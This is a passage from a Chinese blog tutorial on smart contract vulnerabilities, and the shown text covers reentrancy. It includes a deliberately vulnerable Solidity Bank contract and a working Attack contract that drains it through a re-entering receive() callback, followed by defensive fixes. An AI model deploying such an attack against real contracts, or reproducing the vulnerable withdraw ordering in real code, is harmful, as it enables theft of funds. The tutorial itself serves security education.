@@ -1,0 +1,2114 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>合约安全问题研究 - 早起的老年人の博客</title><meta name="Description" content="早起的老年人做的网站"><meta property="og:url" content="https://baskep.top/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6/">
+  <meta property="og:site_name" content="早起的老年人の博客">
+  <meta property="og:title" content="合约安全问题研究">
+  <meta property="og:description" content="前言 在web3中，去中心化让服务变得自发的治理，让参与者能够参与、制定社区的运维方向。但同时，区块的可见性、数据的公开性，让心怀不轨的人有了">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-12-10T01:54:55+08:00">
+    <meta property="article:modified_time" content="2024-12-10T01:54:55+08:00">
+    <meta property="og:image" content="https://baskep.top/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://baskep.top/logo.png">
+  <meta name="twitter:title" content="合约安全问题研究">
+  <meta name="twitter:description" content="前言 在web3中，去中心化让服务变得自发的治理，让参与者能够参与、制定社区的运维方向。但同时，区块的可见性、数据的公开性，让心怀不轨的人有了">
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="canonical" href="https://baskep.top/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6/" /><link rel="prev" href="https://baskep.top/layer0layer1layer2%E5%88%86%E7%B1%BB/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "合约安全问题研究",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/baskep.top\/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6\/"
+        },"image": ["https:\/\/baskep.top\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  12291 ,
+        "url": "https:\/\/baskep.top\/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6\/","datePublished": "2024-12-10T01:54:55+08:00","dateModified": "2024-12-10T01:54:55+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/baskep.top\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "早起的老年人"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="早起的老年人の博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fa fa-book'></i> 文章 </a><a class="menu-item" href="/categories/"><i class='fa fa-th'></i> 分类 </a><a class="menu-item" href="/about/"><i class='fa fa-info-circle'></i> 关于 </a><a class="menu-item" href="/links/"><i class='fas fa-user-friends'></i> 友链 </a><a class="menu-item" href="https://github.com/baskep" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i> Github </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="早起的老年人の博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title=""><i class='fa fa-book'></i>文章</a><a class="menu-item" href="/categories/" title=""><i class='fa fa-th'></i>分类</a><a class="menu-item" href="/about/" title=""><i class='fa fa-info-circle'></i>关于</a><a class="menu-item" href="/links/" title=""><i class='fas fa-user-friends'></i>友链</a><a class="menu-item" href="https://github.com/baskep" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>Github</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">合约安全问题研究</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>早起的老年人</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw"></i>日常学习</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-12-10">2024-12-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 12291 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 25 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#1重入攻击">1.重入攻击</a>
+      <ul>
+        <li><a href="#11攻击方式">1.1.攻击方式</a></li>
+        <li><a href="#12预防方式">1.2.预防方式</a>
+          <ul>
+            <li><a href="#121优化withdraw方法">1.2.1.优化withdraw方法</a></li>
+            <li><a href="#122添加重入锁">1.2.2.添加重入锁</a></li>
+            <li><a href="#123拉取支付">1.2.3.拉取支付</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#2选择器碰撞">2.选择器碰撞</a>
+      <ul>
+        <li><a href="#21攻击方式">2.1.攻击方式</a></li>
+        <li><a href="#22预防方式">2.2.预防方式</a></li>
+      </ul>
+    </li>
+    <li><a href="#3中心化风险">3.中心化风险</a>
+      <ul>
+        <li><a href="#31攻击方式">3.1.攻击方式</a></li>
+        <li><a href="#32预防方式">3.2.预防方式</a></li>
+      </ul>
+    </li>
+    <li><a href="#4权限管理漏洞">4.权限管理漏洞</a>
+      <ul>
+        <li><a href="#41攻击方式">4.1.攻击方式</a>
+          <ul>
+            <li><a href="#411权限管理漏洞">4.1.1.权限管理漏洞</a></li>
+            <li><a href="#412授权检查漏洞">4.1.2.授权检查漏洞</a></li>
+          </ul>
+        </li>
+        <li><a href="#42预防方式">4.2.预防方式</a>
+          <ul>
+            <li><a href="#421增加特定的修饰器控制权限">4.2.1.增加特定的修饰器，控制权限</a></li>
+            <li><a href="#422在函数的逻辑中确保合约调用者拥有足够的授权">4.2.2.在函数的逻辑中确保合约调用者拥有足够的授权</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#5整型溢出">5.整型溢出</a>
+      <ul>
+        <li><a href="#51攻击方式">5.1.攻击方式</a></li>
+        <li><a href="#52预防方式">5.2.预防方式</a></li>
+      </ul>
+    </li>
+    <li><a href="#6签名重放">6.签名重放</a>
+      <ul>
+        <li><a href="#61攻击方式">6.1.攻击方式</a></li>
+        <li><a href="#62预防方式">6.2.预防方式</a>
+          <ul>
+            <li><a href="#621记录已经使用过的签名">6.2.1.记录已经使用过的签名</a></li>
+            <li><a href="#622将nonce和chainid包含在签名消息中">6.2.2.将nonce和chainid包含在签名消息中</a></li>
+            <li><a href="#623对签名的长度进行校验">6.2.3.对签名的长度进行校验</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#7伪随机数">7.伪随机数</a>
+      <ul>
+        <li><a href="#71攻击方式">7.1.攻击方式</a></li>
+        <li><a href="#72预防方式">7.2.预防方式</a></li>
+      </ul>
+    </li>
+    <li><a href="#8绕过合约长度检查">8.绕过合约长度检查</a>
+      <ul>
+        <li><a href="#81攻击方式">8.1.攻击方式</a></li>
+        <li><a href="#82预防方式">8.2.预防方式</a></li>
+      </ul>
+    </li>
+    <li><a href="#9拒绝服务">9.拒绝服务</a>
+      <ul>
+        <li><a href="#91攻击方式">9.1.攻击方式</a></li>
+        <li><a href="#92预防方式">9.2.预防方式</a></li>
+      </ul>
+    </li>
+    <li><a href="#10貔貅盘">10.貔貅盘</a>
+      <ul>
+        <li><a href="#101攻击方式">10.1.攻击方式</a></li>
+        <li><a href="#102预防方式">10.2.预防方式</a></li>
+      </ul>
+    </li>
+    <li><a href="#11txorigin钓鱼攻击">11.TxOrigin钓鱼攻击</a>
+      <ul>
+        <li><a href="#111攻击方式">11.1.攻击方式</a></li>
+        <li><a href="#112预防方式">11.2.预防方式</a>
+          <ul>
+            <li><a href="#1121使用msgsender代替txorigin">11.2.1.使用msg.sender代替tx.origin</a></li>
+            <li><a href="#1122检查txorigin--msgsender">11.2.2.检查tx.origin == msg.sender</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#12unchecked-call">12.Unchecked Call</a>
+      <ul>
+        <li><a href="#121攻击方式">12.1.攻击方式</a></li>
+        <li><a href="#122预防方式">12.2.预防方式</a>
+          <ul>
+            <li><a href="#1221检查低级调用的返回值">12.2.1.检查低级调用的返回值</a></li>
+            <li><a href="#1222合约转账eth时使用-call并做好重入保护">12.2.2.合约转账ETH时，使用 call()，并做好重入保护</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#13nft重入攻击">13.NFT重入攻击</a>
+      <ul>
+        <li><a href="#131攻击方式">13.1.攻击方式</a></li>
+        <li><a href="#132预防方式">13.2.预防方式</a>
+          <ul>
+            <li><a href="#1321使用变量记录mint过的地址避免重复操作">13.2.1.使用变量记录mint过的地址，避免重复操作</a></li>
+            <li><a href="#1322重入锁">13.2.2.重入锁</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#14跨服重入攻击">14.跨服重入攻击</a>
+      <ul>
+        <li><a href="#141攻击方式">14.1.攻击方式</a>
+          <ul>
+            <li><a href="#1411跨函数重入攻击">14.1.1.跨函数重入攻击</a></li>
+            <li><a href="#1412跨合约重入攻击">14.1.2.跨合约重入攻击</a></li>
+            <li><a href="#1413跨项目重入攻击">14.1.3.跨项目重入攻击</a></li>
+          </ul>
+        </li>
+        <li><a href="#142预防方式">14.2.预防方式</a>
+          <ul>
+            <li><a href="#1421全局重入锁">14.2.1.全局重入锁</a></li>
+            <li><a href="#1422只读重入保护">14.2.2.只读重入保护</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#总结">总结</a></li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="前言">前言</h1>
+<p>在web3中，去中心化让服务变得自发的治理，让参与者能够参与、制定社区的运维方向。但同时，区块的可见性、数据的公开性，让心怀不轨的人有了更多获利的空间。在开发合约时，如果对合约交互设计考虑不完全，会带来各种安全隐患，从而造成巨大的经济损失</p>
+<h1 id="1重入攻击">1.重入攻击</h1>
+<p>重入攻击是智能合约中最常见的一种攻击，攻击者通过合约漏洞（例如 fallback 函数）循环调用合约，将合约中资产转走或铸造大量代币</p>
+<h2 id="11攻击方式">1.1.攻击方式</h2>
+<p>比如有一个银行合约，有存款、取款、查询余额功能，合约示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Bank</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balanceOf</span><span class="p">;</span>    <span class="c1">// 余额mapping
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 存入ether，并更新余额
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 提取msg.sender的全部ether
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span> <span class="c1">// 获取余额
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="nb">balance</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Insufficient balance&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">balance</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Failed to send Ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 更新余额
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 获取银行合约的余额
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">getBalance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里<code>msg.sender.call</code>会为取款方转账，如果取款方是<code>合约</code>，必须实现<code>receive</code>、<code>fallback</code>函数。当<code>bank</code>为取款合约转账时，就会触发取款合约的<code>receive</code>、<code>fallback</code>函数，攻击者就可以在<code>receive</code>、<code>fallback</code>中添加攻击代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">bank</span><span class="p">.</span><span class="n">withdraw</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>造成取款的反复调用，直到<code>bank</code>余额清零，示例攻击代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attack</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Bank</span> <span class="k">public</span> <span class="n">bank</span><span class="p">;</span> <span class="c1">// Bank合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 初始化Bank合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">Bank</span> <span class="n">_bank</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bank</span> <span class="o">=</span> <span class="n">_bank</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">bank</span><span class="p">.</span><span class="n">getBalance</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">bank</span><span class="p">.</span><span class="n">withdraw</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 攻击函数，调用时 msg.value 设为 1 ether
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;Require 1 Ether to attack&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bank</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bank</span><span class="p">.</span><span class="n">withdraw</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 获取本合约的余额
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">getBalance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="12预防方式">1.2.预防方式</h2>
+<h3 id="121优化withdraw方法">1.2.1.优化withdraw方法</h3>
+<p>先清空余额，再进行转账。这样后续重复调用时，<code>require</code>校验不能通过，就不会重复执行转账方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">balance</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Insufficient balance&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">balance</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Failed to send Ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="122添加重入锁">1.2.2.添加重入锁</h3>
+<p>实现一个<code>modifier</code>，增加一个控制方法调用的状态变量，当方法调用完成时，状态反转</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">uint256</span> <span class="k">private</span> <span class="n">_status</span><span class="p">;</span> <span class="c1">// 重入锁
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 重入锁
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">modifier</span> <span class="nf">nonReentrant</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 在第一次调用 nonReentrant 时，_status 将是 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nb">require</span><span class="p">(</span><span class="n">_status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;ReentrancyGuard: reentrant call&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 在此之后对 nonReentrant 的任何调用都将失败
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">_status</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 调用结束，将 _status 恢复为0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">_status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>只需要用<code>nonReentrant</code>重入锁修饰<code>withdraw()</code>函数，就可以预防重入攻击了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">external</span> <span class="n">nonReentrant</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">balance</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Insufficient balance&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">balance</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Failed to send Ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="123拉取支付">1.2.3.拉取支付</h3>
+<p>通过引入第三方(escrow)，将原先的“主动转账”分解为“转账者发起转账”加上“接受者主动拉取”</p>
+<p>当想要发起一笔转账时，会通过<code>_asyncTransfer(address dest, uint256 amount)</code>将待转账金额存储到第三方合约中，从而避免因重入导致的自身资产损失</p>
+<p>而当接受者想要接受转账时，需要主动调用<code>withdrawPayments(address payable payee)</code>进行资产的主动获取</p>
